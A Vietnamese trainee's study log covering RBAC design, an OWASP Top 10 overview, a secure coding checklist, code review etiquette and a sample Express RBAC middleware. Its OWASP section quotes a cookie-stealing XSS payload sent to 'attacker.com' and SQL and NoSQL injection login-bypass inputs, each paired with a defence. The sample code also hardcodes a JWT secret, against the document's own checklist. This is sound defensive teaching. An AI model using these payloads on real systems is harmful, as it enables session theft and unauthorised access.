# 📋 Learning Review — Ngày 29/09/2026 (Thứ Ba)

---

## 🎯 Thông tin chung

| Mục | Chi tiết |
|-----|---------|
| **Ngày** | 29/09/2026 (Tue) |
| **Chủ đề** | **Review Meeting + Authorization (RBAC), OWASP Top 10 & Secure Coding** |
| **Session Type** | Review (30 min) + Self-Study |
| **Report Required** | ✅ Yes |

---

## 📚 Nội dung học chính

> **Review 30 phút với Mentor về API Authentication (OAuth 2.0, JWT) + Thiết kế phân quyền người dùng theo vai trò (RBAC - Role-Based Access Control), Các lỗ hổng bảo mật phổ biến OWASP Top 10 (Injection, XSS, Broken Access Control), Quy trình Secure Coding Checklist và Văn hóa cho/nhận phản hồi Code Review (PR Feedback) chuyên nghiệp.**

---

## 🤝 Summary: Buổi Review 30 Phút Với Mentor

### Nội dung đã được Mentor đánh giá & phản hồi:
1. **OAuth 2.0 & PKCE**:
   - Khái niệm PKCE (`code_verifier` & `code_challenge`) là bắt buộc đối với SPA (Single Page App) để chống tấn công Interception Code trên trình duyệt.
   - Phân biệt rõ giữa **Authentication** (Xác thực danh tính: "Bạn là ai?") và **Authorization** (Ủy quyền/Phân quyền: "Bạn có quyền làm gì?").
2. **JWT Best Practices**:
   - Không lưu trữ dữ liệu PII nhạy cảm (như mật khẩu, credit card) trong JWT Payload.
   - Triển khai **Refresh Token Rotation**: Xoay Refresh Token ở mỗi lần cấp lại Access Token và thu hồi ngay nếu phát hiện Token cũ tái sử dụng.
3. **Lưu trữ Token Client-side**:
   - Sử dụng `HttpOnly`, `SameSite=Strict`, `Secure` Cookie cho Refresh Token để vô hiệu hóa hoàn toàn khả năng bị đánh cắp qua tấn công XSS.

---

## 🔍 Key Concepts cần nắm vững

### 1. Role-Based Access Control (RBAC) Design

RBAC là mô hình quản lý phân quyền trong hệ thống phần mềm dựa trên **Vai trò (Roles)** của người dùng thay vì cấp quyền trực tiếp cho từng tài khoản cá nhân.

```
┌──────────────┐       ┌──────────────┐       ┌────────────────────┐
│    Users     │ ───>  │    Roles     │ ───>  │    Permissions     │
├──────────────┤       ├──────────────┤       ├────────────────────┤
│ Nguyen Van A │       │ Admin        │       │ users:delete       │
│ Tran Thi B   │       │ Manager      │       │ reports:read       │
│ Le Van C     │       │ User         │       │ products:create    │
└──────────────┘       └──────────────┘       └────────────────────┘
```

#### Các thành phần chính trong RBAC:
1. **User**: Người dùng trong hệ thống (gắn với `userId`).
2. **Role**: Vai trò công việc (ví dụ: `admin`, `manager`, `user`, `editor`).Một user có thể có 1 hoặc nhiều roles.
3. **Permission**: Quyền hạn thao tác cụ thể dạng `<resource>:<action>` (ví dụ: `products:read`, `users:delete`, `orders:create`).

#### So sánh RBAC vs ABAC (Attribute-Based Access Control):
- **RBAC**: Đơn giản, dễ quản lý, dựa trên Role cố định. Phù hợp cho 90% ứng dụng phổ thông.
- **ABAC**: Linh hoạt, dựa trên ngữ cảnh thuộc tính người dùng, thời gian, địa lý, sở hữu tài sản (ví dụ: "User A chỉ được sửa bài viết do chính User A tạo ra trong khung giờ 8h-17h").

---

## 🛡️ 2. Tổng quan OWASP Top 10 Basics

OWASP (Open Web Application Security Project) là danh sách 10 lỗ hổng bảo mật web nguy hiểm nhất thế giới.

```
                             OWASP TOP 10 CORE RISKS
┌─────────────────────────────────────────────────────────────────────────────┐
│ 1. Broken Access Control  │ Không kiểm tra quyền ở Backend (IDOR)          │
│ 2. Cryptographic Failures │ Mã hóa yếu, lộ Secret Key trong Git            │
│ 3. Injection (SQL/NoSQL)  │ Đưa câu lệnh độc hại vào input truy vấn DB      │
│ 4. Insecure Design        │ Thiếu kiến trúc bảo mật từ bước thiết kế        │
│ 5. Security Misconfig     │ Để chế độ Debug mode trên Production            │
│ 6. Vulnerable Components  │ Dùng thư viện npm cũ có lỗ hổng bảo mật        │
│ 7. Auth Failures          │ Cho phép brute-force password, token yếu       │
│ 8. Software/Data Integrity│ Cập nhật mã nguồn không kiểm tra chữ ký         │
│ 9. Logging Failures       │ Không ghi log hành vi tấn công                 │
│ 10. Server-Side Request   │ Ép Server tự gửi request độc hại (SSRF)         │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Chi tiết 3 lỗ hổng phổ biến nhất:

1. **A01: Broken Access Control (Lỗi phân quyền)**:
   - Hacker đổi ID trên URL `/api/orders/100` thành `/api/orders/101` để xem đơn hàng của người khác (Insecure Direct Object Reference - IDOR).
   - **Cách phòng chống**: Luôn kiểm tra `req.user.id === order.ownerId` hoặc áp dụng Middleware phân quyền RBAC chặt chẽ ở cấp Backend.

2. **A03: Injection (SQL & NoSQL Injection)**:
   - Hacker nhập `' OR '1'='1` vào ô tìm kiếm hoặc body để can thiệp vào câu lệnh CSDL.
   - Trong MongoDB: Nhập body `{ "username": "admin", "password": { "$ne": null } }` để vượt qua kiểm tra mật khẩu.
   - **Cách phòng chống**: Sử dụng **Parameterized Queries** (Prepared Statements trong SQL) hoặc Mongoose ORM/ODM, không bao giờ cộng chuỗi trực tiếp vào query.

3. **Cross-Site Scripting (XSS)**:
   - Hacker chèn mã JavaScript độc hại `<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>` vào comment hoặc input form. Khi người dùng khác xem trang, mã JS này sẽ tự động chạy trên trình duyệt của nạn nhân.
   - **Cách phòng chống**: Sanitization lọc thẻ HTML ở Backend, Output Encoding ở Frontend (React tự động encode JSX), dùng `HttpOnly` Cookie.

---

## 📋 3. Secure Coding Checklist (Bảng kiểm mã nguồn an toàn)

Mọi Developer trước khi tạo Pull Request (PR) cần tự rà soát theo bảng kiểm sau:

- [ ] **Input Validation & Sanitization**: Tất cả input từ người dùng (`req.body`, `req.query`, `req.params`) phải được kiểm tra kiểu dữ liệu (Joi, Zod) và loại bỏ ký tự độc hại.
- [ ] **Authentication & Authorization**: Không có endpoint nhạy cảm nào bị bỏ quên kiểm tra Token và Role/Permission ở Backend.
- [ ] **Secrets Management**: Tuyệt đối không hardcode API Keys, DB Passwords, JWT Secrets trong mã nguồn. Sử dụng file `.env` và đưa `.env` vào `.gitignore`.
- [ ] **Output Encoding & Error Handling**: Không trả về chi tiết Stack Trace (`err.stack`) cho Client trên môi trường Production để tránh lộ cấu trúc hạ tầng.
- [ ] **Security Headers**: Đã cấu hình các HTTP Security Headers (`Helmet`, `X-Content-Type-Options`, `X-Frame-Options`, `CSP`).
- [ ] **Dependency Audit**: Đã chạy `npm audit` để đảm bảo các gói thư viện bên thứ ba không chứa lỗ hổng bảo mật CVE công khai.

---

## 💬 4. Văn hóa cho & nhận phản hồi PR (Constructive PR Feedback)

Code Review là hoạt động nâng cao chất lượng mã nguồn và chia sẻ kiến thức đồng đội, không phải là nơi chỉ trích cá nhân.

```
                     QUY TRÌNH PHẢN HỒI PULL REQUEST
┌─────────────────────────────────────────────────────────────────────────────┐
│ Tác giả PR (Author)                Reviewer (Người kiểm duyệt)             │
├───────────────────────────────────┬─────────────────────────────────────────┤
│ • Viết PR description rõ ràng     │ • Tập trung vào CODE, không tấn công    │
│ • Chia nhỏ PR (< 400 dòng)        │   cá nhân ("Code này có thể tối ưu..."   │
│ • Đính kèm kết quả test tự động   │   thay vì "Sao viết kém thế?")          │
│ • Cởi mở với góp ý, giải trình    │ • Phân biệt rõ Blocking vs Nitpick      │
│   lý do kỹ thuật lịch sự          │ • Giải thích LÝ DO kèm gợi ý sửa        │
└───────────────────────────────────┴─────────────────────────────────────────┘
```

### Các nguyên tắc cho Reviewer:
1. **Phân loại mức độ nhận xét**:
   - `[Blocking]`: Lỗi bảo mật, bug logic nghiêm trọng, hỏng test (Bắt buộc sửa mới được merge).
   - `[Non-blocking / Suggestion]`: Gợi ý cải tiến style code, tối ưu nhỏ (Có thể sửa hoặc cân nhắc ở PR sau).
   - `[Nitpick]`: Chi tiết rất nhỏ về format/tên biến.
   - `[Praise]`: Khen ngợi giải pháp hay của tác giả 👏.
2. **Đưa ra giải pháp thay vì chỉ chỉ trích**:
   - *Không nên*: "Đoạn code này xử lý chậm quá."
   - *Nên*: "Đoạn này dùng `forEach` thực hiện 100 truy vấn DB tuần tự. Chúng ta có thể dùng `Promise.all` hoặc 1 câu query `$in` để tối ưu thời gian phản hồi."

### Các nguyên tắc cho Tác giả PR:
- Không coi phản hồi code review là sự công kích cá nhân.
- Nếu không đồng ý với nhận xét, hãy đưa ra bằng chứng kỹ thuật (Benchmark, tài liệu chính thức) một cách tôn trọng.

---

## 🛠️ Thực hành / Hands-on Implementation

Dự án mẫu thực hành phân quyền RBAC & Secure API tại: [`demos/day-29-rbac-authorization/`](file:///c:/Users/Sinh%20Huan/Desktop/Fullstack_learning/demos/day-29-rbac-authorization/)

### Cấu trúc mã nguồn phân quyền (`server.js`):

```javascript
import express from 'express';
import jwt from 'jsonwebtoken';

const app = express();
const JWT_SECRET = 'rbac-secret-key-2026-fullstack';

// Matrix phân quyền
const ROLE_PERMISSIONS = {
  admin: ['users:read', 'users:delete', 'reports:read', 'products:manage'],
  manager: ['users:read', 'reports:read', 'products:manage'],
  user: ['products:read']
};

// 1. Middleware kiểm tra Vai trò (Role)
export function authorizeRoles(...allowedRoles) {
  return (req, res, next) => {
    if (!req.user || !allowedRoles.includes(req.user.role)) {
      return res.status(403).json({
        success: false,
        error: 'Access Denied',
        message: `Tài khoản vai trò '${req.user?.role}' không có quyền truy cập endpoint này.`
      });
    }
    next();
  };
}

// 2. Middleware kiểm tra Quyền cụ thể (Permission)
export function authorizePermission(requiredPermission) {
  return (req, res, next) => {
    const permissions = ROLE_PERMISSIONS[req.user?.role] || [];
    if (!permissions.includes(requiredPermission)) {
      return res.status(403).json({
        success: false,
        error: 'Permission Denied',
        message: `Thiếu quyền cụ thể '${requiredPermission}'`
      });
    }
    next();
  };
}

// Endpoints ví dụ
app.get('/api/manager/reports', authenticateToken, authorizeRoles('manager', 'admin'), (req, res) => {
  res.json({ success: true, message: 'Báo cáo doanh thu' });
});

app.delete('/api/admin/users/:id', authenticateToken, authorizeRoles('admin'), (req, res) => {
  res.json({ success: true, message: 'Xóa user thành công' });
});
```

---

## 🧪 Kiểm thử & Kết quả

Bộ kiểm thử tự động `test-rbac.js` đã thực thi thành công 10/10 test cases:

```bash
cd demos/day-29-rbac-authorization
npm test
```

### Kết quả kiểm thử thực tế:
- ✅ **Test 1**: Public endpoint `/api/public/health` mở không cần token (HTTP 200).
- ✅ **Test 2**: Từ chối truy cập `/api/user/profile` khi thiếu Token (HTTP 401).
- ✅ **Test 3**: Cho phép Regular User xem Profile của chính mình (HTTP 200).
- ✅ **Test 4**: Chặn Regular User cố truy cập Báo cáo Manager (HTTP 403 Forbidden).
- ✅ **Test 5**: Cho phép Manager truy cập Báo cáo Manager (HTTP 200).
- ✅ **Test 6**: Cho phép Admin truy cập Báo cáo Manager (HTTP 200).
- ✅ **Test 7**: Chặn Manager cố xóa User người khác (HTTP 403 - Admin Only).
- ✅ **Test 8**: Cho phép Admin thực hiện xóa User thành công (HTTP 200).
- ✅ **Test 9**: Chặn User tạo sản phẩm khi thiếu quyền `products:manage` (HTTP 403).
- ✅ **Test 10**: Cho phép Manager tạo sản phẩm thành công với quyền `products:manage` (HTTP 201).

---

## 📌 Tổng kết & Core Takeaways

1. **RBAC Control**: Luôn áp dụng mô hình phân quyền rõ ràng (Role Matrix & Permission Flags) ở tầng Backend Middleware, không dựa vào ẩn/hiện nút bấm ở Frontend.
2. **OWASP Prevention**: Sử dụng ORM/Query Builder để chống SQL/NoSQL Injection, cài đặt HTTP Security Headers và làm sạch input đầu vào để loại bỏ lỗ hổng XSS.
3. **PR Feedback Culture**: Xây dựng thói quen Code Review xây dựng, tách biệt giữa lỗi nghiêm trọng (`[Blocking]`) và góp ý cải tiến style (`[Suggestion]`).
